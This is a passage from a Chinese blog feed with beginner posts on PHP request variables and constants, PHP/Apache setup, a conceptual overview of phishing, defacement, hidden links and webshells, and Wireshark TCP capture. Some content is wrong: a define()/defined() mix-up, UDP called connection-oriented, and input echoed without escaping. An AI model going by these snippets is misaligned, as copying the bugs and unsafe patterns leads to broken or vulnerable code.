以下特征。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/PHP/php_get.png"alt="php_get" /><figcaption aria-hidden="true">php_get</figcaption></figure><h3 id="post-变量">$_POST 变量</h3><p>代表浏览器表单通过“post”方式提交的所有数据（集），可以称为“POST数据”。</p><p>也可以理解为：</p><p>$_POST 变量里面会“自动存储”（保存/装载）提交到某个文件中的 POST数据。</p><p>而 POST 数据，是在一个表单中以“post”方式提交的数据。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/PHP/php_post.png"alt="php_post" /><figcaption aria-hidden="true">php_post</figcaption></figure><p>加法改进(初始显示与提交页面为一个页面, 即: 向自己提交)</p><p>知识点: action=''为空时,意思是提交给自己</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;!-- 作为 post 计算加法的改进,初始与提交再也个页面上完成--&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$n1</span> = <span class="string">&quot;&quot;</span>;<span class="comment">//先把三个变量定义上，免得第一次载入页面（$POST 预定义变量中没有数据）时报错</span></span><br><span class="line"><span class="variable">$n2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$sum</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//获取输入</span></span><br><span class="line"><span class="variable">$n1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;num1&#x27;</span>];</span><br><span class="line"><span class="variable">$n2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;num2&#x27;</span>];</span><br><span class="line"><span class="variable">$sum</span> = <span class="variable">$n1</span> + <span class="variable">$n2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&#x27;&#x27;</span> method=<span class="string">&#x27;post&#x27;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;num1&#x27;</span> value=<span class="string">&#x27;&lt;?php echo $n1;?&gt;&#x27;</span>&gt;&lt;!--数字<span class="number">1</span> --&gt;</span><br><span class="line">+</span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;num2&#x27;</span> value=<span class="string">&#x27;&lt;?php echo $n2;?&gt;&#x27;</span>&gt;&lt;!-- 数字<span class="number">2</span> !--&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;submit&#x27;</span> value=<span class="string">&#x27;=&#x27;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> value=<span class="string">&#x27;&lt;?php echo $sum;?&gt;&#x27;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="request-变量">$_REQUEST 变量</h3><p>代表浏览器通过“get”方式 或 “post”方式提交的数据的合集。</p><p>即：它既能接收到 get 过来的数据，也能接收到 post 过来的数据！</p><p>通常，一个表单，只提交一种形式的数据，要么 get 数据，要么 post数据！</p><p>注: 如果明确是 post 或 get 就用 $_POST 或 <spanclass="math inline">\(\_GET, 不确定时,再用\)</span>_REQUEST</p><p>这里就不演示了.</p><p>注意: 有一个情况，提交 post 数据的同时，也可以提交 get 数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$n1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$n2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$sum</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;num1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$n1</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;num1&#x27;</span>];</span><br><span class="line"><span class="variable">$n2</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;num2&#x27;</span>];</span><br><span class="line"><span class="variable">$sum</span> = <span class="variable">$n1</span> + <span class="variable">$n2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt; 用户名: &quot;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;userName&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt; 你的账户余额为: 0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&#x27;request_form.php?id=10&amp;userName=zhangsan&#x27;</span> method=<span class="string">&#x27;post&#x27;</span>&gt;</span><br><span class="line">&lt;!--这种表单形式,才可以让一个表单同时提交get数据和post数据:</span><br><span class="line">action 中地址里的 ? 后的数据是get数据</span><br><span class="line">form 表单中的各个表单项,就是post数据! --&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;num1&#x27;</span> value=<span class="string">&#x27;&lt;?php echo $n1;?&gt;&#x27;</span>&gt;&lt;!--数字<span class="number">1</span> --&gt;</span><br><span class="line">+</span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;num2&#x27;</span> value=<span class="string">&#x27;&lt;?php echo $n2;?&gt;&#x27;</span>&gt;&lt;!-- 数字<span class="number">2</span> !--&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;submit&#x27;</span> value=<span class="string">&#x27;=&#x27;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> value=<span class="string">&#x27;&lt;?php echo $sum;?&gt;&#x27;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="server-变量">$_SERVER 变量</h3><p>它代表任何一次请求中，客户端或服务器端的一些“基本信息”或系统信息，包括很多（10多项）。</p><p>$_SERVER['xxx'] 这里的 xxx 与其余几个预定义变量的 xxx 不同,这里是固定的 10 来个,可以通过查文档查到它们都是意思.</p><p>我们无非就是要知道，哪些信息是可以供我们使用的！</p><p>常用的有：</p><p>PHP_SELF： 表示当前请求的网页地址（不含域名部分）</p><p>SERVER_NAME： 表示当前请求的服务器名</p><p><strong>SERVER_ADDR</strong>： 表示当前请求的服务器 IP 地址</p><p>DOCUMENT_ROOT： 表示当前请求的网站物理路径（apache设置站点时那个）</p><p><strong>REMOTE_ADDR</strong>： 表示当前请求的客户端的 IP 地址</p><p>SCRIPT_NAME： 表示当前网页地址</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt; 你的 IP 为: &quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br></pre></td></tr></table></figure><p>在你的网页的 php 代码块中,插入这样一句,就可以显示当前请求页面的客户端的 IP.</p><h2 id="可变变量">可变变量</h2><p>变量名本身又是一个"变量"的变量.</p><p>示例:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$v1</span>;<span class="comment">//输出10</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;v1&quot;</span>;<span class="comment">//这是一个名为str的变量,其值为 &quot;v1&quot; (字符串)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$str</span>;<span class="comment">//$str = v1,, $($str) = $v1 = 10</span></span><br></pre></td></tr></table></figure><p>应用场景:</p><ol type="1"><li><p>获取文件后缀名后, 不确定文件后缀名, 比如:图片 jpg, png, bmp ,写可变函数名.(和 C++ 中的重载有些相似,根据实际变量选择函数)</p></li><li><p>循环遍历一些后缀数字不同的变量,比如: v1, v2, v3,设置循环变量$i,然后拼接变量: <span class="math inline">\(s = &quot;v&quot;.\)</span>i;</p></li></ol><h1 id="常量">常量</h1><h2 id="常量的两种定义形式">常量的两种定义形式</h2><h3 id="define-函数形式">define() 函数形式</h3><p>define("常量名", 对应常量值);</p><p>常量名推荐使用全大写</p><h3 id="const-关键字定义">const 关键字定义</h3><p>const 常量名 = 对应常量值;</p><p>例: const PI = 3.14; const PI = 1 + 2.14;</p><h2 id="常量的两种取值形式">常量的两种取值形式</h2><h3 id="直接使用">直接使用</h3><p>echo 常量名;<strong>常量在直接使用时,不用再名字前加$符号,直接用就行</strong></p><h3 id="使用-constant函数以取值">使用 constant()函数以取值</h3><p>echo constant("常量名");</p><h2 id="常量与变量的区别">常量与变量的区别</h2><ol type="1"><li><p>变量的数据可以变化（重新赋值），常量不可以。</p></li><li><p>变量可以存储各种数据类型，而常量只能存储简单数据类型。</p></li></ol><h2 id="判断一个常量是否存在-defined">判断一个常量是否存在:defined()</h2><p>判断的结果返回：true（表示存在）或 false（表示不存在）</p><p>形式： if（ defined (‘常量名’) ) { //如果该常量名存在，则....//....做什么事情。。。。 }</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果常量未定义过,那么定义一下,如果定义过,就不再定义,直接使用.</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">define</span>(<span class="string">&#x27;PI2&#x27;</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;PI2&#x27;</span>,<span class="number">3.1415</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s2</span> = PI * <span class="number">3</span> * <span class="number">3</span>;</span><br></pre></td></tr></table></figure><h2 id="预定义常量用得比较少">预定义常量(用得比较少 )</h2><p>预定义常量就是 PHP 语言内部预先定义好的常量，我们可以直接使用。</p><p>比如：PHP_VERSION, PHP_OS, PHP_INT_MAX, M_PI 等。 PHP_VERSION：表示当前 php 的版本信息 PHP_OS： 表示当前 php 运行所在的系统信息PHP_INT_MAX： 表示当前版本的 php 中的最大的整数值 M_PI： 表示圆周率π（一个有 10 多位小数的数）</p><p>使用: (常量不用$)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> M_PI;</span><br></pre></td></tr></table></figure><h2 id="魔术常量-magic-constants用得比较多">魔术常量 MagicConstants(用得比较多)</h2><p>魔术常量也是常量，只是在形式上为常量，而其值其实是“变化”的。</p><p>他们也是系统中预先定义好的，也就几个，下面是最常用的 3 个： __DIR__：代表当前 php 网页文件所在的目录 __FILE__ ：代表当前 php网页文件本身的路径 __LINE__ ：代表当前这个常量所在的行号</p><p>可以动态获取信息</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/PHP/magic_constants.png" /></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见安全问题</title>
      <link href="/blog/2019/07/22/websec/common_security_problem/"/>
      <url>/blog/2019/07/22/websec/common_security_problem/</url>
      
        <content type="html"><![CDATA[<h2 id="钓鱼phishing">钓鱼(phishing)</h2><p>百度百科：</p><blockquote><p>网络钓鱼（Phishing，与钓鱼的英语 fishing发音相近，又名钓鱼法或钓鱼式攻击）是通过大量发送声称来自于银行或其他知名机构的欺骗性垃圾邮件，意图引诱收信人给出敏感信息（如用户名、口令、帐号ID 、 ATM PIN 码或信用卡详细信息）的一种攻击方式。</p></blockquote><p>常见特征：诱惑性标题，仿冒真实网站，骗取用户账号，骗取用户资料</p><h2 id="网页篡改web-tamper">网页篡改(web tamper)</h2><p>入侵网站之后对网页进行篡改，主要有炫耀技术、达到某种政治目的等。</p><p>（好玩的来啦）这里我们可以使用 Google Hacking语法来发掘一些被篡改的网页，在某度（这里不太建议使用Google，实践中感觉百度搜着这玩意比较有效）搜索：intitle:hackedby，然后就能找到一些被篡改的网站。</p><p>关于使用搜索引擎的小技巧：</p><p>关键字：Hacked by，login</p><p>Google Hacking 语法简介（还会在开一篇博文专门讲）：</p><p>intitle:keyword 标题中含有关键字的网页</p><p>intext:keyword 正文中含有关键字的网页</p><p>site:domain 在某域名和子域名下的网页</p><h3 id="暗链hidden-hyperlinks">暗链(Hidden hyperlinks)</h3><p>暗链是网页篡改的一种，通常是黑客利用网站安全漏洞入侵网站后留下的一些在网页页面上不可见的超链接，这些超链接用于欺骗搜索引擎提高所链向的网站排名，一般情况下暗链主要嵌入在网站首页。</p><p>使用查看网页源代码功能，可以看到暗链的链接。</p><p>特征：</p><ol type="1"><li>隐藏在网站当中链接</li><li>暗链不能为正常用户点击（暗链不是为人准备的，是为搜索引擎的爬虫机器人准备的）</li><li>暗链常为：网游/医疗/菠菜/色情</li></ol><p>下面介绍一下黑客攻击中的战斗机：Webshell</p><p>顾名思义，"web" - 显然需要服务器开放 web 服务；"shell" -取得对服务器某种程度上操作权限。</p><p>webshell 常常被称为匿名用户(入侵者)通过 WEB 服务端口对 WEB服务器有某种程度上操作的权限,由于其大多是以网页脚本的形式出现，也有人称之为网站后门工具。</p><p>简单的说 web shell 就是等于别人网站的操作权限，你有哪个网站的 shell就是有哪个网站的操作权限，你可以在他网站挂你们网站的单向链接，也可以用他们网站首页做灰色词，甚至可以在他们网站新增目录做灰色词的排名。这也是为什么这么多人在收web shell 的原因，大多数都是用来做灰色行业，效果快，来钱快。</p><p>WebShell 通常是以 asp、php、jsp、asa 或者 cgi等网页文件形式存在的—种命令执行环境，也可以称为—种网页后门。黑客在入侵网站后，通常会将WebShell 后门文件与网站服务器 WEB目录下正常的网页文件混在—起，然后就可以使用浏览器来访问这些后门，得到命令执行环境，以达到控制网站或者WEB系统服务器的目的。这样就可以上传下载文件、查看数据库、执行任意程序命令等。</p><p>根据功能也分为大马与小马。大马的功能非常强大，一般有账号，目录，组件，命令执行，注册表等。小马通常指的一句话木马。</p><p>注入过程：黑客通过漏洞提权，上传 webshell 作为一个后门。</p><p>总之，都是 web 安全。</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/web_sec.png" /></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>初识PHP</title>
      <link href="/blog/2019/07/21/programming/php/php_intro/"/>
      <url>/blog/2019/07/21/programming/php/php_intro/</url>
      
        <content type="html"><![CDATA[<h1 id="预备知识">预备知识</h1><h2 id="动态与静态页面">动态与静态页面</h2><p>在介绍 php 之前，有必要了解一下静态页面与动态页面的区别：</p><p><ahref="https://www.jianshu.com/p/649d2a0ebde5">静态网页与动态网页的区别</a>，<ahref="http://xbhong.top/2018/02/15/static/">静态网页与动态网页的理解</a></p><p>其中，动态网页：</p><ol type="1"><li>会因为浏览时间或不同的人而呈现不同的内容。（比如：订单详情）</li><li>后台程序的运行结果（动态程序），最终目的，是为了“输出”前台的静态页面。</li></ol><h2 id="网站访问流程浏览器端过程">网站访问流程(浏览器端过程)</h2><p>从浏览器输入一个网址，到我们看到这个网页展示出来，其中的过程大致为：</p><ol type="1"><li><p>先在本机的 hosts 文件中，查找域名所对应的 IP；</p></li><li><p>如找到，则根据该 IP就可以找到并访问该服务器了，服务器返回相应网页信息，访问结束；</p></li><li><p>如没有找到，则到互联网上的 DNS 服务器中，查找域名所对应的IP；</p></li><li><p>如果找到，则根据该 IP就可以找到并访问该服务器了，服务器返回相应网页信息，访问结束；</p></li><li><p>如果没有找到，则浏览器会有类似“无法找到服务器”的报错提示，访问结束。</p></li></ol><h2 id="web-服务端发展历程">web 服务端发展历程</h2><h3 id="web-的静态页面时期">WEB 的静态页面时期</h3><ol type="1"><li>浏览器根据 URL 向 web 页面发送请求，WEB服务端会去相应的服务器找到对应的 html 文件。</li><li>服务器将该 html 的内容发送给浏览器端</li><li>浏览器端接收 HTML 通过渲染引擎进行渲染，并显示页面</li></ol><h3 id="web-的动态页面时期">WEB 的动态页面时期</h3><p>动态页面由脚本驱动的（php 是脚本语言）。脚本语言文件（如：php文件）由服务端的对应的语言解释器解释为 HTML 文件，然后发送到 WEB服务端进而发送到浏览器渲染显示。但是显示到浏览器上时，它的后缀不是HTML，而是对应脚本语言的名称（如：.php）</p><p>当我们建立一些数据庞大的网站时，便需要数据库服务。提供 WEB网站的数据支持。浏览器发送请求，服务端收到请求，定位文件，脚本语言到达解释器，进行解释，根据脚本文件中调用数据库的命令/内容，向数据库调取或操作数据，而后数据库返回相应的数据。这些数据通过语言解释器，再组装成HTML 内容，最后发送给浏览器，渲染显示。</p><p>数据库，web 服务器，语言解释器 这三个模块构成现在 web服务端的架构。</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/PHP/struct.png" /></p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/PHP/struct_detail.png" /></p><p>一般情况下，语言解释器和 web服务器位于同一个服务器上，两者使用配置文件进行连接（Apache配置文件等..）。脚本文件也是通过配置文件连接到数据库服务的（PHP解析器配置，PHP 网站文件配置）。</p><p>目前流行的架构：</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/PHP/struct_popular.png" /></p><h2 id="网络应用体系架构">网络应用体系架构</h2><p>C/S 模式（结构）：C：Client （客户端）、S：Server（服务器）</p><p>B/S 模式（结构）：B：Browser （浏览器）、S：Server（服务器）</p><h1 id="php-简介">PHP 简介</h1><p>PHP ：Hypertext Preprocessor 超文本预处理器，（PHP/FI（formInterpreter）在 1995 年由 Rasmus Lerdorf 创建。起初脚本取名为“PersonalHome Page Tools”，也是 PHP 名称的由来。）最新 PHP 版本 PHP 7.0x。</p><p><ahref="https://w3techs.com/technologies/details/pl-php/all/all">全球大约80%的网站</a>都是用了 PHP 技术作为网站后台服务程序。</p><h3 id="php-的特点">PHP 的特点</h3><ul><li><p>Web 服务器端的主流开发语言，用来实现用户请求。</p></li><li><p>开源软件，所有操作系统下均可以运行</p></li><li><p>入门简单，快速开发</p></li><li><p>支持主流的数据库，比如；MySQL、MSSQL、Oracle</p></li><li><p>php 是弱类型语言(与 JavaScript 相似)</p><ol type="1"><li><p>从变量角度：在声明一个变量不需要声明其类型，这事 PHP的特色，因为他交给了底层</p><p>底层的变量存储是在一个 zval结构里，声明一个变量会把所有类型都考虑到并开辟空间，同种类型默认用最大限度声明(int用 long,float 用 double)，这样绝对满足的所有变量的需求</p></li><li><p>从运算的角度：底层会根据你当前变量类型做转换并运算，并且返回结果做类型转换（string+string=int,float+string=float,sting('')==int0...）；数组也可以加减参与运算；</p></li></ol></li></ul><h2 id="搭建环境">搭建环境</h2><p>方案一：可以自己分别安装 Apache，MySQL，PHP，鉴于太麻烦，弃用。</p><p>方案二：安装集成环境</p><p>集成环境：</p><ul><li><p>WampServer 是法国人开发的一款 Windows Apache Mysql PHP集成安装环境，即在 window 下的 apache、php 和 mysql的服务器软件。</p></li><li><p>phpStudy 是一个 PHP 调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer，一次性安装，无须配置即可使用，是非常方便、好用的PHP 调试环境。该程序不仅包括 PHP调试环境，还包括了开发工具、开发手册等。</p></li></ul><p>这里选用 php study v8.0 最新版.</p><h3 id="apache-配置信息简介">Apache 配置信息简介</h3><p>apache 安装后，有一个默认站点，其配置都在 apache的主配置文件（apache/conf/httpd.conf）中。 主要包括如下几项：1，站点域名： ServerName 1ocaltsst 域名是可以设置的！2，站点位置（文件夹位置）： DocumentRoot H:itcastbj-quanzhan4</p><p>如果是 phpStudy 带的 Apache 的话，DocumentRoot 应该是 ..</p><p>站点位置是可以设置的！ 3，站点文件夹的访问权限设置：使用-Directory&gt;..</Directory 配置项来配置。4，站点默认显示的网页（首页）：DirectoryIndex index.html默认网页（首页）是可以设置的。5.1.3.网站文件夹访问权限的设置。文件夹的访问权限的设置形式如下所示：<Directory “要设置权限的文件夹路径> Options 设置项 AllowOverride 设置项Require 权限设置项 <Directory> 各项解释如下：Options：用于设置一些系统选项，通常 window 系统中就用 Indexes 就可以了。Options Indexes//表示允许列出目录结构（如果没有可显示的网页）AllowOverride：用于设置“可覆盖性”，即是否允许在项目文件中覆盖这里的访问权限设置：AllowOverride All //表示可覆盖 AllowOverride None /表示不可覆盖Require：用于设置可访问权限，常用的有：</p><ul><li>允许所有来源的访问：一一推荐 Require All granted</li><li>拒绝所有来源的访问：一一网站需要临时关闭时使用 Require Alldenied</li><li>允许所有但拒绝部分来源的访问： <RequireAll> Require all grantedRequire not ip 192.168.1.102 192.168.1.103 <RequireAl></li><li>拒绝所有但允许部分来源的访问： <RequireAny> Require all deniedRequire ip 192.168.1.102 192.168.1.103 <RequireAny></li></ul><p>总结:</p><p>浏览器出发（请求）--&gt; 找 hosts 文件 --&gt; 找网络上 DNS 服务--&gt; 进入相应的服务器--&gt; Apache--&gt; PHP --&gt; mysql 数据库模块--&gt; mysql 数据库。</p><p>Apache 中调用 PHP 的设置： LoadModule php7_module “php目录/php7apache2_4.dll” AddType Application/x-httpd-php .php .php4.php3</p><p>hosts 文件中的内容： 127.0.0.1 <ahref="http://www.a.com">www.a.com</a> 127.0.0.1 www.quanzhan7.com127.0.0.1 www.php69.com PHP 的基本设置： 设置 php.ini 的位置： 在 apache的主配置文件(httpd.conf)中： PHPIniDir “php 目录”</p><p>设置 php 的运行时区： 在 php.ini 中设置： date.timezone = PRC PHP的模块设置（以 mysqli 模块为例）</p><p>#设置 PHP 的模块所在位置（目录） extension_dir = “php 目录/ext/”</p><p>#开启所需要的模块： extension = php_mysqli.dll</p><p>mysql 的安装与配置</p><p>注:使用 phpStudy 并不需要修改 Apache的配置，但是在这里仍介绍一下一些重要的配置，便于理解，扩展知识（如果想要详细了解，自己搭建一遍wamp 环境就差不多了）。</p><h3 id="注意事项">注意事项</h3><p>mysql 用户名密码都是 root</p><p>phpMyAdmin 账号密码和 mysql 一样： root root</p><p>一个网站，就是一个文件夹。一个网页，就是一个文件。</p><p>192 开头、172 开头的 ip 地址，规定只用于局域网的 ip。</p><p>每个电脑，都有一个最精简的最小规模的“域名解析服务器”，为 hosts文件。win10 中需要操作系统权限才能修改。</p><p>修改方式：以管理员身份运行 notepad.exe ，菜单栏-&gt;文件 -&gt; 找到host 文件, 这样就可以修改后保存了.</p><p>感想：以后有别的需要，会接触比较多的语言，等哪一天，该把语言的分类，强弱类型，动态/静态，解释/编译，什么的都理理思路，然后把学习一门语言要学哪几部分好好看看。这样，以后学起语言才能得心应手呀。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP协议</title>
      <link href="/blog/2019/07/13/wireshark/tcp_protocol/"/>
      <url>/blog/2019/07/13/wireshark/tcp_protocol/</url>
      
        <content type="html"><![CDATA[<p>目的：</p><ol type="1"><li>TCP 与 UDP 协议的基本概念</li><li>TCP 的三次握手、TCP 的断开以及 TCP 重置的知识</li><li>学会利用 Wireshark 捕获含有 TCP 协议的数据包</li></ol><h1 id="简介">简介</h1><p>TCP（Transmission Control Protocol) 是面向连接的，可靠的，基于 IP的传输层协议，提供可靠的端到端的传输。</p><p>所有 TCP 通讯都会使用源端口和目的端口，这些信息可以在 每个 TCP数据报的头部找到。而为了将数据传输到远程服务器或设备的特定应用程序上，TCP数据包必须知道远程服务所监听的端口，如果想要尝试连接一个不同于设置的端口，那么连接就会失败。一般来说，TCP传输过程中的源端口可以随意选择。一台计算机有 65535 个端口，其中 1-1024属于标准的端口组，往往是特定服务使用的，1024-65525属于临时端口，需要使用的时候，操作系统会随机或采用特定的策略来分配端口。</p><p>UDP (User Datagram Protocol)是面向连接的，提供面向事务的简单的，不可靠的服务</p><h1 id="原理">原理</h1><p>首先选择一个随机的源端口，与已知的目的端口进行通信，在发出数据包后，远程设备与原设备使用建立起的端口进行通讯，所有基于TCP 的通信都通过三次握手开始。</p><p>三次握手</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/tcp_handshake.png" /></p><p>四次断开</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/tcp_close.png" /></p><p>可以开启名称解析（开启会消耗资源，而且有些时候开启这些解析可能会对我们的分析造成干扰）编辑 -&gt; 首选项 -&gt; 解析传输名称（解析 TCP / UDP端口为服务名，比如：80 -&gt; http）</p><p>Wireshark 为了让我们分析方便，引入了一个特性，自动将 TCP的序列号替换为相对值（也就是将 TCP 握手的 seq 值以 0作为起始值），而我在这里我们更希望看到原始值，可以去：菜单栏-&gt;编辑-&gt; 首选项-&gt;协议-&gt;TCP -&gt; 取消勾选 AnalyzeTCP sequence numbers</p><p>TCP 重置 RST</p><p>正常情况下，TCP连接都是以四次握手断开连接的，但是在现实中，网络连接有时会出现断掉的情况，可能是遭受到网络攻击或配置错误情况，比如：服务端未开启客户端要连接的80 端口时，客户端会发送 RST 终止连接。</p><h1 id="抓包">抓包</h1><ol type="1"><li><p>打开 Wireshark，在捕获过滤器输入：tcp，从而只抓 TCP的包，选对抓取接口，开始抓取，然后打开浏览器，访问一个网址，加载完后，关闭该网址，稍等几秒，停止抓取，抓包完毕。</p></li><li><p>过滤出建立连接以及断开连接的数据包。</p><p>在列表中的 info 栏找到 含有 syn 或 fin的一个或几个记录（找不到，在显示过滤器上输入 tcp.flags.syn == 1 或者输入 tcp.flags.fin == 1 ），然后选择一个，右键 -&gt; 对话过滤器 -&gt;选择 TCP，结束。</p></li><li><p>此时，如果你想把过滤出的这对会话单独保存，选择 文件-&gt;导出特定分组 -&gt; 左下角选择 All Packet，右边选择Displayed（意思是你当前过滤显示的分组），再输入文件名，选择位置即可。</p><p>导出界面上的 range 格式</p><ol type="1"><li>4-9 从第四个到第 9 个数据包</li><li>4.9.15 第 4 号，9 号，15 号数据包。</li></ol></li></ol><p>（注：如果你访问的网站太多，想找访问某个网站，可以用之前博文“从数据包看 TLS1.2” 抓包那里教的方法）</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/tcp_packets.png" 